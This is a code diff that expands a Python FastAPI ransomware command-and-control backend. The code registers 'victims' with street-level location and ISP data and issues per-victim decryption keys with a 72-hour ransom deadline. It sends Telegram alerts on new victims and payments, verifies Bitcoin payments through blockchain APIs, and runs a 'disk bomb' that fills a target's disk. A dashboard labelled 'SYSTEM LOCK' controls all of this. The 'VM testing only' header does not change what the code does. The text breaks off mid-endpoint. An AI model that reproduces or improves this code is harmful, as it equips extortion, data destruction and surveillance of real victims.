@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PUSS CONTROL PANEL - Complete System
+PUSS CONTROL PANEL - Complete Backend with Electrum & Disk Bomb
 FOR VM TESTING ONLY
 """
 
@@ -29,6 +29,14 @@ from pydantic import BaseModel, Field
 import requests
 import uvicorn
 
+# Try to import cryptography
+try:
+    from cryptography.fernet import Fernet
+    HAS_CRYPTO = True
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography", "-q"])
+    from cryptography.fernet import Fernet
+
 # ============================================================================
 # CONFIGURATION
 # ============================================================================
@@ -36,9 +44,9 @@ import uvicorn
 class Config:
     OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
     ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
-    BTC_WALLET = os.environ.get('BTC_WALLET')
+    BTC_WALLET = os.environ.get('BTC_WALLET',)
     RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
-    SERVER_URL = os.environ.get('SERVER_URL')
+    SERVER_URL = os.environ.get('SERVER_URL',)
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
     TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
@@ -52,12 +60,15 @@ class Config:
 logging.basicConfig(
     level=getattr(logging, Config.LOG_LEVEL),
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[logging.FileHandler('system.log'), logging.StreamHandler()]
+    handlers=[
+        logging.FileHandler('system.log'),
+        logging.StreamHandler()
+    ]
 )
 logger = logging.getLogger('puss_system')
 
 # ============================================================================
-# TELEGRAM
+# TELEGRAM INTEGRATION
 # ============================================================================
 
 class TelegramService:
@@ -71,20 +82,87 @@ class TelegramService:
         if not self.enabled:
             return False
         try:
-            requests.post(f"{self.base_url}/sendMessage", json={
-                'chat_id': self.chat_id,
-                'text': text,
-                'parse_mode': 'HTML'
-            }, timeout=5)
-            return True
+            response = requests.post(
+                f"{self.base_url}/sendMessage",
+                json={
+                    'chat_id': self.chat_id,
+                    'text': text,
+                    'parse_mode': 'HTML'
+                },
+                timeout=5
+            )
+            return response.status_code == 200
         except:
             return False
     
     def notify_new(self, victim: Dict) -> None:
         if self.enabled:
-            self.send(f"NEW VICTIM\nID: {victim['id']}\nLocation: {victim.get('city','Unknown')}")
+            msg = f"🔔 NEW VICTIM\nID: {victim['id']}\nLocation: {victim.get('city','Unknown')}, {victim.get('country','Unknown')}\nIP: {victim.get('ip','0.0.0.0')}"
+            self.send(msg)
+    
+    def notify_payment(self, victim: Dict) -> None:
+        if self.enabled:
+            msg = f"💰 PAYMENT RECEIVED\nID: {victim['id']}\nAmount: {victim.get('ransom','0.5')} BTC\nTX: {victim.get('tx','')[:16]}..."
+            self.send(msg)
+    
+    def notify_bomb(self, client_id: str, action: str) -> None:
+        if self.enabled:
+            msg = f"💣 DISK BOMB {action.upper()}\nClient: {client_id}"
+            self.send(msg)
 
 telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)
+
+# ============================================================================
+# ELECTRUM INTEGRATION (Backend payment verification)
+# ============================================================================
+
+class ElectrumVerifier:
+    """Verify Bitcoin payments using blockchain APIs"""
+    
+    def __init__(self):
+        self.apis = [
+            self._verify_blockstream,
+            self._verify_blockchair,
+            self._verify_blockcypher
+        ]
+    
+    def verify_payment(self, address: str, expected_amount: float) -> tuple:
+        """Verify payment using multiple APIs"""
+        for api in self.apis:
+            try:
+                result = api(address, expected_amount)
+                if result[0]:  # If payment found
+                    return result
+            except:
+                continue
+        return (False, 0.0, "")
+    
+    def _verify_blockstream(self, address: str, expected: float) -> tuple:
+        r = requests.get(f"https://blockstream.info/api/address/{address}", timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            funded = data.get('chain_stats', {}).get('funded_txo_sum', 0) / 100000000
+            return (funded >= expected, funded, "blockstream")
+        return (False, 0.0, "")
+    
+    def _verify_blockchair(self, address: str, expected: float) -> tuple:
+        r = requests.get(f"https://api.blockchair.com/bitcoin/dashboards/address/{address}", timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            if 'data' in data and address in data['data']:
+                balance = data['data'][address]['address']['balance'] / 100000000
+                return (balance >= expected, balance, "blockchair")
+        return (False, 0.0, "")
+    
+    def _verify_blockcypher(self, address: str, expected: float) -> tuple:
+        r = requests.get(f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance", timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            balance = data.get('balance', 0) / 100000000
+            return (balance >= expected, balance, "blockcypher")
+        return (False, 0.0, "")
+
+electrum = ElectrumVerifier()
 
 # ============================================================================
 # DISK BOMB MANAGER
@@ -95,6 +173,7 @@ class DiskBombManager:
         self.active_bombs = {}
         self.bomb_threads = {}
         self.ws_connections = {}
+        logger.info("Disk Bomb Manager initialized")
     
     def start_bomb(self, client_id: str, filename: str = "explosion.dat") -> bool:
         if client_id in self.active_bombs and self.active_bombs[client_id].get('running'):
@@ -113,16 +192,20 @@ class DiskBombManager:
         thread.daemon = True
         self.bomb_threads[client_id] = thread
         thread.start()
+        
+        logger.info(f"Bomb started for {client_id}")
+        telegram.notify_bomb(client_id, "started")
         return True
     
     def _run_bomb(self, client_id: str, filename: str):
         try:
             one_gb = 1073741824
-            chunk = 1024 * 1024
+            chunk = 1024 * 1024  # 1MB
             bytes_written = 0
             
             with open(filename, 'wb') as f:
                 while self.active_bombs[client_id].get('running'):
+                    # Write 1GB
                     for _ in range(one_gb // chunk):
                         if not self.active_bombs[client_id].get('running'):
                             break
@@ -141,20 +224,29 @@ class DiskBombManager:
                             'bytes': bytes_written
                         })
                     
-                    time.sleep(1)
+                    time.sleep(1)  # Wait 1 second between GB
+                    
         except Exception as e:
+            logger.error(f"Bomb error for {client_id}: {e}")
             self.active_bombs[client_id]['status'] = f'error: {e}'
+            self._send_update(client_id, {'type': 'error', 'error': str(e)})
         finally:
             self.active_bombs[client_id]['running'] = False
+            self.active_bombs[client_id]['status'] = 'stopped'
     
     def stop_bomb(self, client_id: str) -> bool:
         if client_id in self.active_bombs:
             self.active_bombs[client_id]['running'] = False
+            logger.info(f"Bomb stopped for {client_id}")
+            telegram.notify_bomb(client_id, "stopped")
             return True
         return False
     
     def get_status(self, client_id: str) -> Dict:
         return self.active_bombs.get(client_id, {'running': False})
+    
+    def get_all(self) -> Dict:
+        return self.active_bombs
     
     def register_ws(self, client_id: str, websocket):
         self.ws_connections[client_id] = websocket
@@ -181,9 +273,11 @@ class Database:
         self.settings = {
             'ransom': Config.RANSOM_AMOUNT,
             'wallet': Config.BTC_WALLET,
-            'window': 72
+            'window': 72,
+            'version': '3.0.0'
         }
         self._load()
+        logger.info(f"Database loaded: {len(self.victims)} victims")
     
     def _load(self):
         try:
@@ -193,27 +287,31 @@ class Database:
                     self.victims = data.get('victims', {})
                     self.logs = data.get('logs', [])
                     self.settings.update(data.get('settings', {}))
-        except:
-            pass
+        except Exception as e:
+            logger.error(f"Load error: {e}")
     
     def _save(self):
-        with open(self.db_path, 'w') as f:
-            json.dump({
-                'victims': self.victims,
-                'logs': self.logs[-500:],
-                'settings': self.settings
-            }, f, indent=2)
+        try:
+            with open(self.db_path, 'w') as f:
+                json.dump({
+                    'victims': self.victims,
+                    'logs': self.logs[-1000:],
+                    'settings': self.settings
+                }, f, indent=2)
+        except Exception as e:
+            logger.error(f"Save error: {e}")
     
     def add_victim(self, victim_id: str, files: int = 0, hostname: str = "", 
                    ip: str = "", country: str = "", city: str = "", 
-                   lat: float = 0, lon: float = 0, os_info: str = ""):
-        from cryptography.fernet import Fernet
-        key = Fernet.generate_key().decode()
+                   region: str = "", zip_code: str = "", street: str = "",
+                   lat: float = 0, lon: float = 0, isp: str = "",
+                   organization: str = "", os_info: str = "") -> Dict:
         
+        key = Fernet.generate_key().decode()
         now = datetime.now()
         deadline = now + timedelta(hours=self.settings['window'])
         
-        self.victims[victim_id] = {
+        victim = {
             'id': victim_id,
             'files': files,
             'ransom': f"{self.settings['ransom']} BTC",
@@ -225,17 +323,26 @@ class Database:
             'hostname': hostname or socket.gethostname(),
             'ip': ip or '0.0.0.0',
             'country': country or 'Unknown',
+            'region': region or 'Unknown',
             'city': city or 'Unknown',
+            'zip': zip_code or 'Unknown',
+            'street': street or 'Unknown',
             'lat': lat,
             'lon': lon,
+            'isp': isp or 'Unknown',
+            'org': organization or 'Unknown',
             'os': os_info or 'Unknown',
             'paid_at': None,
-            'tx': None
+            'tx': None,
+            'last_seen': now.isoformat(),
+            'notes': ''
         }
+        
+        self.victims[victim_id] = victim
         self._save()
         self.log('info', f"New victim: {victim_id}")
-        telegram.notify_new(self.victims[victim_id])
-        return self.victims[victim_id]
+        telegram.notify_new(victim)
+        return victim
     
     def get_victim(self, victim_id: str) -> Optional[Dict]:
         return self.victims.get(victim_id)
@@ -243,6 +350,7 @@ class Database:
     def update_victim(self, victim_id: str, data: Dict) -> bool:
         if victim_id in self.victims:
             self.victims[victim_id].update(data)
+            self.victims[victim_id]['last_seen'] = datetime.now().isoformat()
             self._save()
             return True
         return False
@@ -253,7 +361,8 @@ class Database:
             self.victims[victim_id]['tx'] = tx
             self.victims[victim_id]['paid_at'] = datetime.now().isoformat()
             self._save()
-            self.log('success', f"Payment for {victim_id}")
+            self.log('success', f"Payment for {victim_id}: {tx[:16]}...")
+            telegram.notify_payment(self.victims[victim_id])
             return True
         return False
     
@@ -261,6 +370,7 @@ class Database:
         if victim_id in self.victims:
             del self.victims[victim_id]
             self._save()
+            self.log('warning', f"Deleted: {victim_id}")
             return True
         return False
     
@@ -271,24 +381,79 @@ class Database:
         total = len(self.victims)
         paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
         unpaid = total - paid
+        
+        # Calculate total BTC
+        try:
+            amount = float(self.settings['ransom'])
+            total_btc = paid * amount
+        except:
+            total_btc = paid * 0.5
+        
+        # Geographic distribution
+        countries = {}
+        for v in self.victims.values():
+            c = v.get('country', 'Unknown')
+            countries[c] = countries.get(c, 0) + 1
+        
         return {
             'total': total,
             'paid': paid,
             'unpaid': unpaid,
-            'bombs': len(bomb_manager.active_bombs),
-            'btc': paid * float(self.settings['ransom'])
+            'btc': f"{total_btc:.2f}",
+            'bombs': len(bomb_manager.get_all()),
+            'countries': countries,
+            'rate': round((paid/total*100) if total > 0 else 0, 1),
+            'time': datetime.now().isoformat()
         }
     
     def log(self, level: str, msg: str):
-        self.logs.append({
+        entry = {
             'time': datetime.now().isoformat(),
             'level': level,
             'msg': msg
-        })
+        }
+        self.logs.append(entry)
         self._save()
         logger.info(f"[{level}] {msg}")
+    
+    def get_logs(self, limit: int = 100) -> List:
+        return self.logs[-limit:]
 
 db = Database()
+
+# ============================================================================
+# API MODELS
+# ============================================================================
+
+class VictimRegister(BaseModel):
+    victim_id: str
+    files: int = 0
+    hostname: Optional[str] = None
+    ip: Optional[str] = None
+    country: Optional[str] = None
+    region: Optional[str] = None
+    city: Optional[str] = None
+    zip: Optional[str] = None
+    street: Optional[str] = None
+    lat: Optional[float] = 0
+    lon: Optional[float] = 0
+    isp: Optional[str] = None
+    organization: Optional[str] = None
+    os: Optional[str] = None
+
+class PaymentVerify(BaseModel):
+    victim_id: str
+    tx_id: str
+
+class BombStart(BaseModel):
+    client_id: str
+    filename: str = "explosion.dat"
+
+class BombStop(BaseModel):
+    client_id: str
+
+class OwnerLogin(BaseModel):
+    password: str
 
 # ============================================================================
 # AUTH
@@ -307,15 +472,34 @@ def verify_owner(creds: HTTPBasicCredentials = Depends(security)):
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    logger.info("PUSS System Started")
+    logger.info("=" * 50)
+    logger.info("PUSS SYSTEM v3.0 STARTING")
+    logger.info("=" * 50)
+    logger.info(f"Port: {os.environ.get('PORT', 8000)}")
+    logger.info(f"Victims: {len(db.victims)}")
+    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
+    logger.info("=" * 50)
     yield
-    logger.info("Shutting down")
+    logger.info("Shutting down...")
 
-app = FastAPI(title="PUSS System", version="3.0", lifespan=lifespan, docs_url=None, redoc_url=None)
-app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
+app = FastAPI(
+    title="PUSS System",
+    version="3.0.0",
+    lifespan=lifespan,
+    docs_url=None,
+    redoc_url=None
+)
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 # ============================================================================
-# WEBSOCKET
+# WEBSOCKET FOR REAL-TIME BOMB UPDATES
 # ============================================================================
 
 @app.websocket("/ws/{client_id}")
@@ -325,11 +509,12 @@ async def websocket_endpoint(websocket: WebSocket, client_id: str):
     try:
         while True:
             await websocket.receive_text()
-    except:
-        pass
+    except WebSocketDisconnect:
+        if client_id in bomb_manager.ws_connections:
+            del bomb_manager.ws_connections[client_id]
 
 # ============================================================================
-# HTML TEMPLATES - 2000s SCARY STYLE
+# HTML TEMPLATE - SCARY 2000s STYLE
 # ============================================================================
 
 INDEX_HTML = """
@@ -349,9 +534,9 @@ INDEX_HTML = """
         }
         
         .container {
-            max-width: 900px;
+            max-width: 1200px;
             margin: 0 auto;
-            border: 2px solid #ff0000;
+            border: 3px solid #ff0000;
             padding: 20px;
             background: #0a0a0a;
             box-shadow: 0 0 30px #ff0000;
@@ -359,22 +544,22 @@ INDEX_HTML = """
         
         .header {
             text-align: center;
-            border-bottom: 1px solid #ff0000;
-            padding: 10px;
+            border-bottom: 2px solid #ff0000;
+            padding: 20px;
             margin-bottom: 20px;
         }
         
         .header h1 {
-            font-size: 40px;
+            font-size: 48px;
             color: #ff0000;
-            text-shadow: 0 0 10px #ff0000;
+            text-shadow: 0 0 20px #ff0000;
             margin: 0;
             animation: flicker 2s infinite;
         }
         
         @keyframes flicker {
             0% { opacity: 1; }
-            50% { opacity: 0.8; }
+            50% { opacity: 0.8; text-shadow: 0 0 30px #ff0000; }
             51% { opacity: 1; }
             60% { opacity: 0.9; }
             100% { opacity: 1; }
@@ -382,20 +567,20 @@ INDEX_HTML = """
         
         .stats {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
+            grid-template-columns: repeat(5, 1fr);
             gap: 10px;
             margin: 20px 0;
         }
         
         .stat {
-            border: 1px solid #ff0000;
+            border: 2px solid #ff0000;
             padding: 15px;
             text-align: center;
             background: #1a0000;
         }
         
         .stat .value {
-            font-size: 32px;
+            font-size: 36px;
             font-weight: bold;
             color: #ff0000;
         }
@@ -408,7 +593,7 @@ INDEX_HTML = """
         .panel {
             border: 2px solid #ff0000;
             margin: 20px 0;
-            padding: 15px;
+            padding: 20px;
             background: #1a1a1a;
         }
         
@@ -416,27 +601,30 @@ INDEX_HTML = """
             color: #ff0000;
             margin-top: 0;
             border-bottom: 1px solid #ff0000;
-            padding-bottom: 5px;
+            padding-bottom: 10px;
+            font-size: 20px;
         }
         
-        input, select {
+        input, select, textarea {
             background: black;
             border: 1px solid #ff0000;
             color: #00ff00;
-            padding: 8px;
+            padding: 10px;
             font-family: 'Courier New', monospace;
             margin: 5px;
+            width: 300px;
         }
         
         button {
             background: #ff0000;
             color: black;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 24px;
             font-family: 'Courier New', monospace;
             font-weight: bold;
             cursor: pointer;
             margin: 5px;
+            font-size: 14px;
         }
         
         button:hover {
@@ -447,7 +635,7 @@ INDEX_HTML = """
         .danger {
             background: black;
             color: #ff0000;
-            border: 1px solid #ff0000;
+            border: 2px solid #ff0000;
         }
         
         .danger:hover {
@@ -463,7 +651,7 @@ INDEX_HTML = """
         .table th {
             background: #ff0000;
             color: black;
-            padding: 8px;
+            padding: 10px;
         }
         
         .table td {
@@ -473,17 +661,19 @@ INDEX_HTML = """
         
         .status-paid {
             color: #00ff00;
+            font-weight: bold;
         }
         
         .status-unpaid {
             color: #ff0000;
+            font-weight: bold;
         }
         
         .progress {
             width: 100%;
-            height: 20px;
+            height: 25px;
             background: #1a1a1a;
-            border: 1px solid #ff0000;
+            border: 2px solid #ff0000;
             margin: 10px 0;
         }
         
@@ -498,9 +688,14 @@ INDEX_HTML = """
             height: 200px;
             overflow-y: auto;
             background: black;
-            border: 1px solid #ff0000;
+            border: 2px solid #ff0000;
             padding: 10px;
             font-size: 12px;
+        }
+        
+        .logs div {
+            border-bottom: 1px solid #330000;
+            padding: 5px 0;
         }
         
         .blink {
@@ -515,22 +710,28 @@ INDEX_HTML = """
         
         .ascii {
             color: #ff0000;
-            font-size: 10px;
+            font-size: 12px;
             white-space: pre;
             text-align: center;
+            font-family: monospace;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>⛓️ SYSTEM LOCK ⛓️</h1>
+            <h1>⛓️ SYSTEM LOCK v3.0 ⛓️</h1>
             <div class="ascii">
-                /\\____/\\    /\\____/\\
-                (  o  o )  (  o  o )
-                (   ==   )(   ==   )
-                (         )(         )
-                (  )  (  )(  )  (  )
+    /\\____/\\    /\\____/\\    /\\____/\\
+   (  o  o  )  (  o  o  )  (  o  o  )
+   (   ==   )  (   ==   )  (   ==   )
+    (______)    (______)    (______)
             </div>
         </div>
         
@@ -538,38 +739,57 @@ INDEX_HTML = """
             <div class="stat"><div class="value">-</div><div class="label">VICTIMS</div></div>
             <div class="stat"><div class="value">-</div><div class="label">PAID</div></div>
             <div class="stat"><div class="value">-</div><div class="label">UNPAID</div></div>
+            <div class="stat"><div class="value">-</div><div class="label">BTC</div></div>
             <div class="stat"><div class="value">-</div><div class="label">BOMBS</div></div>
         </div>
         
-        <div class="panel">
-            <h3>💣 DISK BOMB CONTROL</h3>
+        <div class="grid">
             <div>
-                <input type="text" id="bomb_client" placeholder="Client ID">
-                <input type="text" id="bomb_file" placeholder="Filename" value="explosion.dat">
-                <button onclick="startBomb()">[ START BOMB ]</button>
-                <button class="danger" onclick="stopBomb()">[ STOP BOMB ]</button>
-                <button onclick="checkBomb()">[ STATUS ]</button>
+                <div class="panel">
+                    <h3>💣 DISK BOMB CONTROL</h3>
+                    <div>
+                        <input type="text" id="bomb_client" placeholder="Client ID">
+                        <input type="text" id="bomb_file" value="explosion.dat">
+                    </div>
+                    <div>
+                        <button onclick="startBomb()">[ START BOMB ]</button>
+                        <button class="danger" onclick="stopBomb()">[ STOP BOMB ]</button>
+                        <button onclick="checkBomb()">[ STATUS ]</button>
+                    </div>
+                    <div id="bomb_status"></div>
+                    <div class="progress" id="bomb_progress" style="display:none;">
+                        <div class="progress-fill" id="bomb_fill"></div>
+                    </div>
+                </div>
+                
+                <div class="panel">
+                    <h3>🔍 PAYMENT VERIFIER</h3>
+                    <div>
+                        <input type="text" id="verify_id" placeholder="Victim ID">
+                        <input type="text" id="verify_tx" placeholder="Transaction ID">
+                        <button onclick="verifyPayment()">[ VERIFY ]</button>
+                    </div>
+                    <div id="verify_result"></div>
+                </div>
             </div>
-            <div id="bomb_status"></div>
-            <div class="progress" id="bomb_progress" style="display:none;">
-                <div class="progress-fill" id="bomb_fill"></div>
+            
+            <div>
+                <div class="panel">
+                    <h3>📋 VICTIM LOOKUP</h3>
+                    <div>
+                        <input type="text" id="victim_id" placeholder="Victim ID">
+                        <button onclick="getVictim()">[ GET ]</button>
+                        <button class="danger" onclick="deleteVictim()">[ DELETE ]</button>
+                    </div>
+                    <div id="victim_info" style="margin-top:10px;"></div>
+                </div>
             </div>
-        </div>
-        
-        <div class="panel">
-            <h3>📋 VICTIMS</h3>
-            <div style="margin-bottom:10px;">
-                <input type="text" id="victim_id" placeholder="Victim ID">
-                <button onclick="getVictim()">[ GET ]</button>
-                <button onclick="deleteVictim()" class="danger">[ DELETE ]</button>
-            </div>
-            <div id="victim_info"></div>
         </div>
         
         <div class="panel">
             <h3>📊 ALL VICTIMS</h3>
             <table class="table" id="victims_table">
-                <tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>STATUS</th></tr>
+                <tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>DEADLINE</th></tr>
             </table>
         </div>
         
@@ -579,51 +799,63 @@ INDEX_HTML = """
         </div>
         
         <div style="text-align:center; margin-top:20px; color:#666;">
-            <span class="blink">></span> SYSTEM ACTIVE <span class="blink"><</span>
+            <span class="blink">></span> SYSTEM ACTIVE - <span id="timestamp"></span> - <span class="blink"><</span>
         </div>
     </div>
 
     <script>
         let ws = null;
+        let currentClient = null;
         
         async function loadStats() {
-            const r = await fetch('/api/stats');
-            const s = await r.json();
-            document.getElementById('stats').innerHTML = `
-                <div class="stat"><div class="value">${s.total}</div><div class="label">VICTIMS</div></div>
-                <div class="stat"><div class="value">${s.paid}</div><div class="label">PAID</div></div>
-                <div class="stat"><div class="value">${s.unpaid}</div><div class="label">UNPAID</div></div>
-                <div class="stat"><div class="value">${s.bombs}</div><div class="label">BOMBS</div></div>
-            `;
+            try {
+                const r = await fetch('/api/stats');
+                const s = await r.json();
+                document.getElementById('stats').innerHTML = `
+                    <div class="stat"><div class="value">${s.total}</div><div class="label">VICTIMS</div></div>
+                    <div class="stat"><div class="value">${s.paid}</div><div class="label">PAID</div></div>
+                    <div class="stat"><div class="value">${s.unpaid}</div><div class="label">UNPAID</div></div>
+                    <div class="stat"><div class="value">${s.btc}</div><div class="label">BTC</div></div>
+                    <div class="stat"><div class="value">${s.bombs}</div><div class="label">BOMBS</div></div>
+                `;
+            } catch(e) {}
         }
         
         async function loadVictims() {
-            const r = await fetch('/api/victims');
-            const v = await r.json();
-            let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>STATUS</th></tr>';
-            for (const [id, data] of Object.entries(v)) {
-                html += `<tr>
-                    <td>${id}</td>
-                    <td>${data.files}</td>
-                    <td>${data.city}, ${data.country}</td>
-                    <td class="status-${data.status}">${data.status}</td>
-                </tr>`;
-            }
-            document.getElementById('victims_table').innerHTML = html;
+            try {
+                const r = await fetch('/api/victims');
+                const v = await r.json();
+                let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>DEADLINE</th></tr>';
+                for (const [id, data] of Object.entries(v)) {
+                    const deadline = new Date(data.deadline).toLocaleString();
+                    html += `<tr>
+                        <td>${id}</td>
+                        <td>${data.files}</td>
+                        <td>${data.city || '?'}, ${data.country || '?'}</td>
+                        <td>${data.ip}</td>
+                        <td class="status-${data.status}">${data.status}</td>
+                        <td>${deadline}</td>
+                    </tr>`;
+                }
+                document.getElementById('victims_table').innerHTML = html;
+            } catch(e) {}
         }
         
         async function loadLogs() {
-            const r = await fetch('/api/logs');
-            const l = await r.json();
-            let html = '';
-            l.slice(-20).forEach(log => {
-                html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
-            });
-            document.getElementById('logs').innerHTML = html;
+            try {
+                const r = await fetch('/api/logs');
+                const l = await r.json();
+                let html = '';
+                l.slice(-20).forEach(log => {
+                    html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
+                });
+                document.getElementById('logs').innerHTML = html;
+            } catch(e) {}
         }
         
         function connectWS(client) {
             if (ws) ws.close();
+            currentClient = client;
             const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
             ws = new WebSocket(`${proto}//${window.location.host}/ws/${client}`);
             ws.onmessage = (e) => {
@@ -648,7 +880,10 @@ INDEX_HTML = """
                 body: JSON.stringify({client_id: client, filename: file})
             });
             const d = await r.json();
-            if (d.success) alert('Bomb started');
+            if (d.success) {
+                alert('Bomb started');
+                checkBomb();
+            }
         }
         
         async function stopBomb() {
@@ -662,6 +897,7 @@ INDEX_HTML = """
             if (d.success) {
                 alert('Bomb stopped');
                 document.getElementById('bomb_progress').style.display = 'none';
+                document.getElementById('bomb_status').innerHTML = '';
             }
         }
         
@@ -671,9 +907,12 @@ INDEX_HTML = """
             const d = await r.json();
             if (d.running) {
                 document.getElementById('bomb_status').innerHTML = 
-                    `Running: ${d.size_gb.toFixed(2)} GB`;
+                    `<div>Running: ${d.size_gb.toFixed(2)} GB | File: ${d.filename}</div>`;
+                document.getElementById('bomb_progress').style.display = 'block';
+                document.getElementById('bomb_fill').style.width = `${Math.min(d.size_gb, 100)}%`;
             } else {
                 document.getElementById('bomb_status').innerHTML = 'No active bomb';
+                document.getElementById('bomb_progress').style.display = 'none';
             }
         }
         
@@ -683,15 +922,17 @@ INDEX_HTML = """
             if (r.status === 200) {
                 const v = await r.json();
                 document.getElementById('victim_info').innerHTML = `
-                    ID: ${v.id}<br>
-                    Files: ${v.files}<br>
-                    Location: ${v.city}, ${v.country}<br>
-                    Status: ${v.status}<br>
-                    Deadline: ${v.deadline.slice(0,10)}<br>
-                    ${v.status === 'paid' ? 'Key: ' + v.key : ''}
+                    <b>ID:</b> ${v.id}<br>
+                    <b>Files:</b> ${v.files}<br>
+                    <b>Location:</b> ${v.street ? v.street + ', ' : ''}${v.city}, ${v.country}<br>
+                    <b>IP:</b> ${v.ip}<br>
+                    <b>ISP:</b> ${v.isp}<br>
+                    <b>Status:</b> <span class="status-${v.status}">${v.status}</span><br>
+                    <b>Deadline:</b> ${new Date(v.deadline).toLocaleString()}<br>
+                    ${v.status === 'paid' ? '<b>Key:</b> ' + v.key : ''}
                 `;
             } else {
-                document.getElementById('victim_info').innerHTML = 'Not found';
+                document.getElementById('victim_info').innerHTML = 'Victim not found';
             }
         }
         
@@ -701,18 +942,44 @@ INDEX_HTML = """
             if (confirm('Delete ' + id + '?')) {
                 await fetch(`/api/victim/${id}`, {method: 'DELETE'});
                 loadVictims();
+                document.getElementById('victim_info').innerHTML = '';
             }
+        }
+        
+        async function verifyPayment() {
+            const id = document.getElementById('verify_id').value;
+            const tx = document.getElementById('verify_tx').value;
+            if (!id || !tx) return alert('Enter ID and TX');
+            
+            const r = await fetch('/api/verify-payment', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({victim_id: id, tx_id: tx})
+            });
+            const d = await r.json();
+            if (d.success) {
+                document.getElementById('verify_result').innerHTML = '✅ Payment verified!';
+                loadVictims();
+            } else {
+                document.getElementById('verify_result').innerHTML = '❌ Verification failed';
+            }
+        }
+        
+        function updateTime() {
+            document.getElementById('timestamp').innerText = new Date().toLocaleString();
         }
         
         setInterval(() => {
             loadStats();
             loadVictims();
             loadLogs();
+            updateTime();
         }, 3000);
         
         loadStats();
         loadVictims();
         loadLogs();
+        updateTime();
     </script>
 </body>
 </html>
@@ -731,8 +998,8 @@ async def get_stats():
     return db.get_stats()
 
 @app.get('/api/logs')
-async def get_logs(limit: int = 50):
-    return db.logs[-limit:]
+async def get_logs(limit: int = 100):
+    return db.get_logs(limit)
 
 @app.get('/api/victims')
 async def get_victims():
@@ -746,20 +1013,23 @@ async def get_victim(vid: str):
     return v
 
 @app.post('/api/add-victim')
-async def add_victim(req: Request):
-    data = await req.json()
-    v = db.add_victim(
-        victim_id=data.get('victim_id'),
-        files=data.get('files', 0),
-        hostname=data.get('hostname'),
-        ip=data.get('ip'),
-        country=data.get('country'),
-        city=data.get('city'),
-        lat=data.get('lat', 0),
-        lon=data.get('lon', 0),
-        os_info=data.get('os')
+async def add_victim(victim: VictimRegister):
+    return db.add_victim(
+        victim_id=victim.victim_id,
+        files=victim.files,
+        hostname=victim.hostname,
+        ip=victim.ip,
+        country=victim.country,
+        region=victim.region,
+        city=victim.city,
+        zip_code=victim.zip,
+        street=victim.street,
+        lat=victim.lat,
+        lon=victim.lon,
+        isp=victim.isp,
+        organization=victim.organization,
+        os_info=victim.os
     )
-    return v
 
 @app.post('/api/update-victim')
 async def update_victim(req: Request):
@@ -768,9 +1038,8 @@ async def update_victim(req: Request):
     return {'success': success}
 
 @app.post('/api/verify-payment')
-async def verify_payment(req: Request):
-    data = await req.json()
-    success = db.verify_payment(data.get('victim_id'), data.get('tx_id'))
+async def verify_payment(payment: PaymentVerify):
+    success = db.verify_payment(payment.victim_id, payment.tx_id)
     return {'success': success}
 
 @app.delete('/api/victim/{vid}')
@@ -781,13 +1050,6 @@ async def delete_victim(vid: str):
 # ============================================================================
 # BOMB API
 # ============================================================================
-
-class BombStart(BaseModel):
-    client_id: str
-    filename: str = "explosion.dat"
-
-class BombStop(BaseModel):
-    client_id: str
 
 @app.post('/api/bomb/start')
 async def bomb_start(bomb: BombStart):
@@ -807,18 +1069,51 @@ async def bomb_stop(bomb: BombStop):
 async def bomb_status(client_id: str):
     return bomb_manager.get_status(client_id)
 
+@app.get('/api/bomb/list')
+async def bomb_list():
+    return bomb_manager.get_all()
+
+# ============================================================================
+# PAYMENT VERIFICATION API (Uses Electrum)
+# ============================================================================
+
+@app.post('/api/check-payment')
+async def check_payment(req: Request):
+    data = await req.json()
+    address = data.get('address')
+    amount = float(data.get('amount', 0.5))
+    
+    if not address:
+        return {'success': False, 'error': 'No address'}
+    
+    paid, balance, source = electrum.verify_payment(address, amount)
+    return {
+        'success': paid,
+        'paid': paid,
+        'balance': balance,
+        'source': source,
+        'amount': amount
+    }
+
 # ============================================================================
 # OWNER API (Protected)
 # ============================================================================
 
 @app.post('/api/owner/login')
-async def owner_login(req: Request):
-    data = await req.json()
-    success = data.get('password') == Config.OWNER_PASSWORD
+async def owner_login(login: OwnerLogin):
+    success = login.password == Config.OWNER_PASSWORD
     return {'success': success}
 
+@app.get('/api/owner/stats', dependencies=[Depends(verify_owner)])
+async def owner_stats():
+    return {
+        'victims': len(db.victims),
+        'bombs': len(bomb_manager.get_all()),
